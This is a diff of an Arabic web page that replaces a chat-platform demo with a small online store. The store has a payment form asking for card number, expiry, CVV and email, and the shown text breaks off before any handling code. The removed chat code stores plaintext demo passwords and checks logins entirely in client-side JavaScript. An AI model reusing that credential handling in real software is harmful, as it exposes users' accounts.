@@ -3,1458 +3,463 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة الدردشة العربية - دردش مع الأصدقاء</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>متجرنا الإلكتروني</title>
     <style>
-        :root {
-            --primary-color: #063e44;
-            --secondary-color: #0aa0b0;
-            --accent-color: #f6b01e;
-            --vip-color: #ff4fa3;
-            --online-color: #28c76f;
-            --offline-color: #ea5455;
-            --background-color: #f6f8fb;
-            --text-color: #333;
-            --light-text: #6c757d;
-            --card-bg: #ffffff;
-            --border-color: #e6e6e6;
-        }
-        
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Cairo', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
-            background-color: var(--background-color);
-            color: var(--text-color);
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
         }
         
-        /* صفحة تسجيل الدخول */
-        .auth-container {
-            display: flex;
-            height: 100vh;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(135deg, var(--primary-color) 0%, #0b4f57 100%);
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
         }
         
-        .auth-box {
-            background-color: var(--card-bg);
-            border-radius: 10px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
-            width: 400px;
-            padding: 30px;
+        header {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: white;
+            padding: 1rem;
             text-align: center;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
         
-        .auth-logo {
+        .products {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        
+        .product-card {
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+        
+        .product-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .product-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+        
+        .product-info {
+            padding: 15px;
+        }
+        
+        .product-title {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .product-price {
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: #2575fc;
+            margin-bottom: 15px;
+        }
+        
+        .buy-btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: opacity 0.3s;
+        }
+        
+        .buy-btn:hover {
+            opacity: 0.9;
+        }
+        
+        .payment-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .payment-form {
+            background: white;
+            width: 90%;
+            max-width: 500px;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .form-title {
+            text-align: center;
             margin-bottom: 20px;
-        }
-        
-        .auth-logo i {
-            font-size: 50px;
-            color: var(--secondary-color);
-        }
-        
-        .auth-logo h1 {
-            font-size: 24px;
-            margin-top: 10px;
-            color: var(--primary-color);
-        }
-        
-        .auth-form {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
+            color: #333;
+            font-size: 1.5rem;
         }
         
         .form-group {
-            text-align: right;
+            margin-bottom: 15px;
         }
         
         .form-group label {
             display: block;
             margin-bottom: 5px;
-            font-weight: bold;
-            color: var(--primary-color);
+            font-weight: 500;
         }
         
-        .form-group input, .form-group select {
+        .form-group input {
             width: 100%;
-            padding: 12px 15px;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-        
-        .form-group input:focus, .form-group select:focus {
-            border-color: var(--secondary-color);
-            outline: none;
-        }
-        
-        .auth-button {
-            background-color: var(--secondary-color);
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            margin-top: 10px;
-        }
-        
-        .auth-button:hover {
-            background-color: #088a99;
-        }
-        
-        .auth-links {
-            margin-top: 20px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 14px;
-        }
-        
-        .auth-links a {
-            color: var(--secondary-color);
-            text-decoration: none;
-        }
-        
-        .auth-links a:hover {
-            text-decoration: underline;
-        }
-        
-        /* الهيدر الثابت */
-        header {
-            background-color: var(--primary-color);
-            color: white;
-            height: 64px;
-            padding: 0 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            z-index: 100;
-            display: none;
-        }
-        
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .user-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            object-fit: cover;
-        }
-        
-        .user-details {
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .user-name {
-            font-weight: bold;
-            font-size: 15px;
-        }
-        
-        .user-role {
-            font-size: 12px;
-            color: var(--secondary-color);
-        }
-        
-        .logo {
-            font-size: 22px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-        }
-        
-        .logo i {
-            margin-left: 10px;
-            font-size: 26px;
-        }
-        
-        .header-icons {
-            display: flex;
-            gap: 20px;
-        }
-        
-        .header-icons i {
-            font-size: 20px;
-            cursor: pointer;
-            transition: color 0.2s;
-        }
-        
-        .header-icons i:hover {
-            color: var(--secondary-color);
-        }
-        
-        /* التخطيط الرئيسي */
-        .main-container {
-            display: flex;
-            flex: 1;
-            overflow: hidden;
-            display: none;
-        }
-        
-        /* العمود الأيسر */
-        .left-sidebar {
-            width: 240px;
-            background-color: var(--card-bg);
-            border-left: 1px solid var(--border-color);
-            display: flex;
-            flex-direction: column;
-            overflow-y: auto;
-            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.05);
-        }
-        
-        .nav-item {
-            display: flex;
-            align-items: center;
-            padding: 15px 20px;
-            border-bottom: 1px solid #f0f0f0;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        
-        .nav-item:hover {
-            background-color: #f9f9f9;
-        }
-        
-        .nav-item i {
-            margin-left: 15px;
-            font-size: 18px;
-            color: var(--secondary-color);
-            width: 24px;
-            text-align: center;
-        }
-        
-        .nav-item span {
-            font-size: 15px;
-        }
-        
-        .more-button {
-            margin-top: auto;
-            margin-bottom: 10px;
-        }
-        
-        /* العمود الأوسط */
-        .chat-container {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            background-color: var(--card-bg);
-            border-left: 1px solid var(--border-color);
-            border-right: 1px solid var(--border-color);
-        }
-        
-        .chat-header {
-            padding: 15px 20px;
-            border-bottom: 1px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        
-        .room-name {
-            font-weight: bold;
-            font-size: 16px;
-        }
-        
-        .room-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .online-count {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 14px;
-            color: var(--light-text);
-        }
-        
-        .online-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background-color: var(--online-color);
-        }
-        
-        .search-box {
-            display: flex;
-            align-items: center;
-            background-color: #f3f6f9;
-            border-radius: 20px;
-            padding: 5px 15px;
-        }
-        
-        .search-box input {
-            border: none;
-            background: transparent;
-            padding: 5px;
-            width: 180px;
-            outline: none;
-        }
-        
-        .messages-container {
-            flex: 1;
-            padding: 20px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            background-color: #f9fafc;
-        }
-        
-        .message {
-            display: flex;
-            gap: 10px;
-            max-width: 80%;
-        }
-        
-        .my-message {
-            align-self: flex-end;
-            flex-direction: row-reverse;
-        }
-        
-        .avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            object-fit: cover;
-            flex-shrink: 0;
-        }
-        
-        .message-content {
-            background-color: #f3f6f9;
-            padding: 10px 15px;
-            border-radius: 18px;
-            font-size: 14px;
-        }
-        
-        .my-message .message-content {
-            background-color: #e6f7ef;
-        }
-        
-        .system-message {
-            align-self: center;
-            background-color: #e6f7ef;
-            color: #28a745;
-            padding: 8px 15px;
-            border-radius: 15px;
-            font-size: 13px;
-            margin: 10px 0;
-        }
-        
-        .message-user-info {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            margin-bottom: 5px;
-        }
-        
-        .message-user-name {
-            font-weight: bold;
-            font-size: 14px;
-        }
-        
-        .message-time {
-            font-size: 11px;
-            color: var(--light-text);
-        }
-        
-        .vip-badge {
-            color: var(--vip-color);
-            font-size: 12px;
-        }
-        
-        .admin-badge {
-            color: var(--accent-color);
-            font-size: 12px;
-        }
-        
-        .super-admin-badge {
-            color: #ea5455;
-            font-size: 12px;
-        }
-        
-        .message-input-container {
-            padding: 15px 20px;
-            border-top: 1px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .add-button {
-            background-color: var(--secondary-color);
-            color: white;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-        }
-        
-        .message-input {
-            flex: 1;
-            border: 1px solid var(--border-color);
-            border-radius: 24px;
-            padding: 10px 20px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        
-        .message-input:focus {
-            border-color: var(--secondary-color);
-        }
-        
-        .send-button {
-            background-color: var(--secondary-color);
-            color: white;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            border: none;
-            outline: none;
-        }
-        
-        /* العمود الأيمن */
-        .right-sidebar {
-            width: 300px;
-            background-color: var(--card-bg);
-            overflow-y: auto;
-            padding: 15px;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-        
-        .user-card {
-            background: linear-gradient(to left, #f9f9f9, var(--card-bg));
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
-            padding: 15px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            position: relative;
-            transition: transform 0.2s, box-shadow 0.2s;
-            cursor: pointer;
-        }
-        
-        .user-card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        
-        .user-card.admin {
-            background: linear-gradient(to left, #f6f3e4, var(--card-bg));
-            border: 1px dashed var(--accent-color);
-        }
-        
-        .user-card.vip {
-            background: linear-gradient(to left, #ffeaf3, var(--card-bg));
-            border: 1px solid var(--vip-color);
-        }
-        
-        .user-card.super-admin {
-            background: linear-gradient(to left, #ffebee, var(--card-bg));
-            border: 1px solid #ea5455;
-        }
-        
-        .card-avatar {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 2px solid #fff;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        
-        .user-card-details {
-            flex: 1;
-        }
-        
-        .card-name {
-            font-weight: bold;
-            font-size: 15px;
-            margin-bottom: 3px;
-        }
-        
-        .card-status {
-            font-size: 13px;
-            color: var(--online-color);
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background-color: var(--online-color);
-        }
-        
-        .status-dot.away {
-            background-color: #ff9f43;
-        }
-        
-        .status-dot.offline {
-            background-color: var(--offline-color);
-        }
-        
-        .card-badge {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            font-size: 14px;
-        }
-        
-        .card-points {
-            background-color: #f3f6f9;
-            padding: 4px 8px;
-            border-radius: 12px;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        
-        .section-title {
-            font-weight: bold;
-            font-size: 16px;
-            padding: 10px 0;
-            color: var(--primary-color);
-            border-bottom: 2px solid var(--secondary-color);
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        
-        .section-title .admin-control {
-            font-size: 14px;
-            color: var(--secondary-color);
-            cursor: pointer;
-        }
-        
-        /* نافذة الإدارة */
-        .admin-panel {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: var(--card-bg);
-            border-radius: 10px;
-            box-shadow: 0 5px 30px rgba(0, 0, 0, 0.3);
-            width: 500px;
-            z-index: 1000;
-            display: none;
-        }
-        
-        .admin-header {
-            background-color: var(--primary-color);
-            color: white;
-            padding: 15px 20px;
-            border-top-left-radius: 10px;
-            border-top-right-radius: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .admin-header h2 {
-            font-size: 18px;
-        }
-        
-        .admin-close {
-            cursor: pointer;
-            font-size: 20px;
-        }
-        
-        .admin-body {
-            padding: 20px;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        
-        .admin-user-list {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        
-        .admin-user-item {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
             padding: 10px;
-            border-bottom: 1px solid var(--border-color);
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
         }
         
-        .admin-user-info {
+        .form-row {
             display: flex;
-            align-items: center;
-            gap: 10px;
+            gap: 15px;
         }
         
-        .admin-user-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            object-fit: cover;
+        .form-row .form-group {
+            flex: 1;
         }
         
-        .admin-user-details {
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .admin-user-name {
-            font-weight: bold;
-            font-size: 14px;
-        }
-        
-        .admin-user-role {
-            font-size: 12px;
-            color: var(--light-text);
-        }
-        
-        .admin-user-actions {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .admin-action-btn {
-            padding: 5px 10px;
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 12px;
+            font-size: 1.1rem;
+            margin-top: 10px;
         }
         
-        .promote-btn {
-            background-color: var(--accent-color);
-            color: white;
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #666;
         }
         
-        .demote-btn {
-            background-color: var(--light-text);
-            color: white;
-        }
-        
-        .remove-btn {
-            background-color: var(--offline-color);
-            color: white;
-        }
-        
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 999;
+        .loading {
             display: none;
+            text-align: center;
+            margin-top: 15px;
         }
         
-        /* تأثيرات للرسائل والدردشة */
-        .typing-indicator {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            color: var(--light-text);
-            font-size: 13px;
-            margin-top: 5px;
-        }
-        
-        .typing-dots {
-            display: flex;
-            gap: 3px;
-        }
-        
-        .typing-dot {
-            width: 5px;
-            height: 5px;
-            border-radius: 50%;
-            background-color: var(--light-text);
-            animation: typingAnimation 1.4s infinite ease-in-out;
-        }
-        
-        .typing-dot:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-        
-        .typing-dot:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-        
-        @keyframes typingAnimation {
-            0%, 60%, 100% {
-                transform: translateY(0);
-            }
-            30% {
-                transform: translateY(-5px);
-            }
-        }
-        
-        /* تنبيهات */
-        .alert {
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 15px;
+        .success-message {
             display: none;
+            text-align: center;
+            color: green;
+            margin-top: 15px;
+            font-weight: bold;
         }
         
-        .alert-error {
-            background-color: #ffebee;
-            color: #d32f2f;
-            border: 1px solid #ffcdd2;
-        }
-        
-        .alert-success {
-            background-color: #e6f7ef;
-            color: #28a745;
-            border: 1px solid #c8e6c9;
-        }
-        
-        /* التكيف مع الشاشات الصغيرة */
-        @media (max-width: 992px) {
-            .left-sidebar {
-                width: 80px;
-            }
-            
-            .nav-item span {
-                display: none;
-            }
-            
-            .nav-item i {
-                margin-left: 0;
-            }
-            
-            .right-sidebar {
-                width: 250px;
-            }
+        .error-message {
+            display: none;
+            text-align: center;
+            color: red;
+            margin-top: 15px;
         }
         
         @media (max-width: 768px) {
-            .right-sidebar {
-                display: none;
+            .products {
+                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
             }
             
-            .auth-box {
-                width: 90%;
+            .form-row {
+                flex-direction: column;
+                gap: 0;
             }
         }
     </style>
 </head>
 <body>
-    <!-- صفحة تسجيل الدخول -->
-    <div class="auth-container" id="loginPage">
-        <div class="auth-box">
-            <div class="auth-logo">
-                <i class="fas fa-comments"></i>
-                <h1>منصة الدردشة العربية</h1>
-            </div>
-            
-            <div class="alert alert-error" id="loginError">
-                <i class="fas fa-exclamation-circle"></i>
-                <span id="errorText">اسم المستخدم أو كلمة المرور غير صحيحة</span>
-            </div>
-            
-            <div class="alert alert-success" id="loginSuccess">
-                <i class="fas fa-check-circle"></i>
-                <span>تم إنشاء الحساب بنجاح، يرجى تسجيل الدخول</span>
-            </div>
-            
-            <form class="auth-form" id="loginForm">
-                <div class="form-group">
-                    <label for="username">اسم المستخدم</label>
-                    <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
+    <div class="container">
+        <header>
+            <h1>متجرنا الإلكتروني</h1>
+            <p>أفضل المنتجات بأفضل الأسعار</p>
+        </header>
+        
+        <div class="products">
+            <!-- المنتج 1 -->
+            <div class="product-card">
+                <img src="https://via.placeholder.com/300x200/6a11cb/ffffff?text=منتج+1" alt="منتج 1" class="product-image">
+                <div class="product-info">
+                    <h3 class="product-title">سماعات لاسلكية عالية الجودة</h3>
+                    <p class="product-price">$99.99</p>
+                    <button class="buy-btn" data-product="سماعات لاسلكية" data-price="99.99">اشتري الآن</button>
                 </div>
-                
-                <div class="form-group">
-                    <label for="password">كلمة المرور</label>
-                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-                </div>
-                
-                <button type="submit" class="auth-button">تسجيل الدخول</button>
-            </form>
+            </div>
             
-            <div class="auth-links">
-                <a href="#" id="showRegister">إنشاء حساب جديد</a>
-                <a href="#">نسيت كلمة المرور؟</a>
+            <!-- المنتج 2 -->
+            <div class="product-card">
+                <img src="https://via.placeholder.com/300x200/2575fc/ffffff?text=منتج+2" alt="منتج 2" class="product-image">
+                <div class="product-info">
+                    <h3 class="product-title">ساعة ذكية متطورة</h3>
+                    <p class="product-price">$149.99</p>
+                    <button class="buy-btn" data-product="ساعة ذكية" data-price="149.99">اشتري الآن</button>
+                </div>
+            </div>
+            
+            <!-- المنتج 3 -->
+            <div class="product-card">
+                <img src="https://via.placeholder.com/300x200/ff6b6b/ffffff?text=منتج+3" alt="منتج 3" class="product-image">
+                <div class="product-info">
+                    <h3 class="product-title">هاتف ذكي بشاشة 6.7 بوصة</h3>
+                    <p class="product-price">$799.99</p>
+                    <button class="buy-btn" data-product="هاتف ذكي" data-price="799.99">اشتري الآن</button>
+                </div>
+            </div>
+            
+            <!-- المنتج 4 -->
+            <div class="product-card">
+                <img src="https://via.placeholder.com/300x200/4ecdc4/ffffff?text=منتج+4" alt="منتج 4" class="product-image">
+                <div class="product-info">
+                    <h3 class="product-title">لوحة مفاتيح ميكانيكية</h3>
+                    <p class="product-price">$129.99</p>
+                    <button class="buy-btn" data-product="لوحة مفاتيح" data-price="129.99">اشتري الآن</button>
+                </div>
             </div>
         </div>
     </div>
-
-    <!-- صفحة التسجيل -->
-    <div class="auth-container" id="registerPage" style="display: none;">
-        <div class="auth-box">
-            <div class="auth-logo">
-                <i class="fas fa-comments"></i>
-                <h1>إنشاء حساب جديد</h1>
-            </div>
-            
-            <div class="alert alert-error" id="registerError">
-                <i class="fas fa-exclamation-circle"></i>
-                <span id="registerErrorText">يرجى ملء جميع الحقول بشكل صحيح</span>
-            </div>
-            
-            <form class="auth-form" id="registerForm">
+    
+    <!-- نموذج الدفع -->
+    <div class="payment-modal" id="paymentModal">
+        <div class="payment-form">
+            <button class="close-btn" id="closeModal">&times;</button>
+            <h2 class="form-title">إتمام عملية الشراء</h2>
+            <form id="paymentForm">
+                <input type="hidden" id="selectedProduct">
+                <input type="hidden" id="selectedPrice">
+                
                 <div class="form-group">
-                    <label for="regUsername">اسم المستخدم</label>
-                    <input type="text" id="regUsername" placeholder="اختر اسم مستخدم" required>
+                    <label for="cardNumber">رقم البطاقة</label>
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required>
                 </div>
                 
                 <div class="form-group">
-                    <label for="regEmail">البريد الإلكتروني</label>
-                    <input type="email" id="regEmail" placeholder="أدخل بريدك الإلكتروني" required>
+                    <label for="cardHolder">اسم حامل البطاقة</label>
+                    <input type="text" id="cardHolder" placeholder="كما هو مكتوب على البطاقة" required>
                 </div>
                 
-                <div class="form-group">
-                    <label for="regPassword">كلمة المرور</label>
-                    <input type="password" id="regPassword" placeholder="اختر كلمة مرور قوية" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="regConfirmPassword">تأكيد كلمة المرور</label>
-                    <input type="password" id="regConfirmPassword" placeholder="أعد إدخال كلمة المرور" required>
-                </div>
-                
-                <button type="submit" class="auth-button">إنشاء الحساب</button>
-            </form>
-            
-            <div class="auth-links">
-                <a href="#" id="showLogin">لديك حساب؟ سجل الدخول</a>
-            </div>
-        </div>
-    </div>
-
-    <!-- الشريط العلوي -->
-    <header id="appHeader">
-        <div class="user-info">
-            <img src="" alt="صورة المستخدم" class="user-avatar" id="headerAvatar">
-            <div class="user-details">
-                <div class="user-name" id="headerUsername">اسم المستخدم</div>
-                <div class="user-role" id="headerRole">مستخدم</div>
-            </div>
-        </div>
-        
-        <div class="logo">
-            <i class="fas fa-comments"></i>
-            <span>منصة الدردشة</span>
-        </div>
-        
-        <div class="header-icons">
-            <i class="fas fa-bell"></i>
-            <i class="fas fa-envelope"></i>
-            <i class="fas fa-users" id="adminPanelButton" style="display: none;"></i>
-            <i class="fas fa-cog"></i>
-            <i class="fas fa-sign-out-alt" id="logoutButton"></i>
-        </div>
-    </header>
-
-    <!-- المحتوى الرئيسي -->
-    <div class="main-container" id="mainContainer">
-        <!-- العمود الأيسر -->
-        <aside class="left-sidebar">
-            <div class="nav-item">
-                <i class="fas fa-home"></i>
-                <span>الصفحة الرئيسية</span>
-            </div>
-            <div class="nav-item">
-                <i class="fas fa-newspaper"></i>
-                <span>الأخبار</span>
-            </div>
-            <div class="nav-item">
-                <i class="fas fa-chart-line"></i>
-                <span>الإحصائيات</span>
-            </div>
-            <div class="nav-item">
-                <i class="fas fa-trophy"></i>
-                <span>المتصدرون</span>
-            </div>
-            <div class="nav-item">
-                <i class="fas fa-gamepad"></i>
-                <span>الألعاب</span>
-            </div>
-            <div class="nav-item">
-                <i class="fas fa-users"></i>
-                <span>المجموعات</span>
-            </div>
-            <div class="nav-item">
-                <i class="fas fa-store"></i>
-                <span>المتجر</span>
-            </div>
-            <div class="nav-item more-button">
-                <i class="fas fa-ellipsis-h"></i>
-                <span>المزيد</span>
-            </div>
-        </aside>
-
-        <!-- العمود الأوسط -->
-        <main class="chat-container">
-            <div class="chat-header">
-                <div class="room-info">
-                    <div class="room-name">غرفة الدردشة العامة</div>
-                    <div class="online-count">
-                        <div class="online-dot"></div>
-                        <span id="onlineCount">0</span> متصل الآن
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="expiryDate">تاريخ الانتهاء</label>
+                        <input type="text" id="expiryDate" placeholder="MM/YY" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" placeholder="123" required>
                     </div>
                 </div>
                 
-                <div class="search-box">
-                    <i class="fas fa-search"></i>
-                    <input type="text" placeholder="بحث في المحادثة...">
+                <div class="form-group">
+                    <label for="email">البريد الإلكتروني</label>
+                    <input type="email" id="email" placeholder="example@domain.com" required>
                 </div>
-            </div>
-            
-            <div class="messages-container" id="messagesContainer">
-                <div class="system-message">
-                    مرحباً بك في غرفة الدردشة العامة! ابدأ المحادثة مع الآخرين.
+                
+                <button type="submit" class="submit-btn">دفع وإتمام الشراء</button>
+                
+                <div class="loading" id="loading">
+                    جاري معالجة الدفع...
                 </div>
-            </div>
-            
-            <div class="message-input-container">
-                <div class="add-button">
-                    <i class="fas fa-plus"></i>
+                
+                <div class="success-message" id="successMessage">
+                    تمت عملية الشراء بنجاح! سيصلك تأكيد على بريدك الإلكتروني.
                 </div>
-                <input type="text" class="message-input" id="messageInput" placeholder="اكتب رسالتك هنا...">
-                <button class="send-button" id="sendMessageButton">
-                    <i class="fas fa-paper-plane"></i>
-                </button>
-            </div>
-        </main>
-
-        <!-- العمود الأيمن -->
-        <aside class="right-sidebar">
-            <div class="section-title">
-                <span>المستخدمون المتصلون</span>
-                <span class="online-count">
-                    <div class="online-dot"></div>
-                    <span id="sidebarOnlineCount">0</span>
-                </span>
-            </div>
-            
-            <div id="onlineUsersList">
-                <!-- سيتم ملء هذه القائمة بالمستخدمين المتصلين عبر JavaScript -->
-            </div>
-        </aside>
-    </div>
-
-    <!-- نافذة الإدارة -->
-    <div class="overlay" id="adminOverlay"></div>
-    
-    <div class="admin-panel" id="adminPanel">
-        <div class="admin-header">
-            <h2>لوحة تحكم المشرفين</h2>
-            <div class="admin-close" id="adminClose">
-                <i class="fas fa-times"></i>
-            </div>
-        </div>
-        
-        <div class="admin-body">
-            <div class="admin-user-list" id="adminUserList">
-                <!-- سيتم ملء هذه القائمة بالمستخدمين عبر JavaScript -->
-            </div>
+                
+                <div class="error-message" id="errorMessage">
+                    حدث خطأ أثناء عملية الدفع. يرجى المحاولة مرة أخرى.
+                </div>
+            </form>
         </div>
     </div>
 
     <script>
-        // بيانات التطبيق
-        const appData = {
-            currentUser: null,
-            users: [
-                { id: 1, username: 'admin', password: 'admin123', email: 'admin@example.com', role: 'super-admin', avatar: 'https://ui-avatars.com/api/?name=Admin&background=ea5455', points: 5000, online: true },
-                { id: 2, username: 'moderator1', password: 'mod123', email: 'mod1@example.com', role: 'admin', avatar: 'https://ui-avatars.com/api/?name=Moderator&background=f6b01e', points: 2500, online: true },
-                { id: 3, username: 'vipuser', password: 'vip123', email: 'vip@example.com', role: 'vip', avatar: 'https://ui-avatars.com/api/?name=VIP&background=ff4fa3', points: 1500, online: true },
-                { id: 4, username: 'user1', password: 'user123', email: 'user1@example.com', role: 'user', avatar: 'https://ui-avatars.com/api/?name=User1&background=0aa0b0', points: 500, online: true }
-            ],
-            messages: [],
-            onlineUsers: []
-        };
-
         // عناصر DOM
-        const loginPage = document.getElementById('loginPage');
-        const registerPage = document.getElementById('registerPage');
-        const appHeader = document.getElementById('appHeader');
-        const mainContainer = document.getElementById('mainContainer');
-        const loginForm = document.getElementById('loginForm');
-        const registerForm = document.getElementById('registerForm');
-        const loginError = document.getElementById('loginError');
-        const loginSuccess = document.getElementById('loginSuccess');
-        const registerError = document.getElementById('registerError');
-        const showRegister = document.getElementById('showRegister');
-        const showLogin = document.getElementById('showLogin');
-        const logoutButton = document.getElementById('logoutButton');
-        const messagesContainer = document.getElementById('messagesContainer');
-        const messageInput = document.getElementById('messageInput');
-        const sendMessageButton = document.getElementById('sendMessageButton');
-        const onlineUsersList = document.getElementById('onlineUsersList');
-        const onlineCount = document.getElementById('onlineCount');
-        const sidebarOnlineCount = document.getElementById('sidebarOnlineCount');
-        const adminPanelButton = document.getElementById('adminPanelButton');
-        const adminPanel = document.getElementById('adminPanel');
-        const adminOverlay = document.getElementById('adminOverlay');
-        const adminClose = document.getElementById('adminClose');
-        const adminUserList = document.getElementById('adminUserList');
-        const headerAvatar = document.getElementById('headerAvatar');
-        const headerUsername = document.getElementById('headerUsername');
-        const headerRole = document.getElementById('headerRole');
-
-        // تهيئة التطبيق
-        function initApp() {
-            // التحقق من وجود مستخدم مسجل دخوله
-            const savedUser = localStorage.getItem('currentUser');
-            if (savedUser) {
-                const user = JSON.parse(savedUser);
-                loginUser(user);
-            }
-
-            // تحميل بعض الرسائل الأولية
-            loadSampleMessages();
-            
-            // تحديث قائمة المستخدمين المتصلين
-            updateOnlineUsers();
-        }
-
-        // تحميل رسائل عينة
-        function loadSampleMessages() {
-            const sampleMessages = [
-                { userId: 1, text: "مرحباً بالجميع في منصة الدردشة العربية! كيف حالكم اليوم؟", timestamp: new Date(Date.now() - 1000 * 60 * 10) },
-                { userId: 3, text: "أهلاً بالجميع! المنتدى رائع اليوم", timestamp: new Date(Date.now() - 1000 * 60 * 8) },
-                { userId: 4, text: "شكراً على الترحيب! أنا جديد هنا", timestamp: new Date(Date.now() - 1000 * 60 * 5) },
-                { userId: 2, text: "مرحباً بك! لا تتردد في طرح أي أسئلة", timestamp: new Date(Date.now() - 1000 * 60 * 3) }
-            ];
-
-            sampleMessages.forEach(msg => {
-                addMessageToChat(msg.userId, msg.text, msg.timestamp);
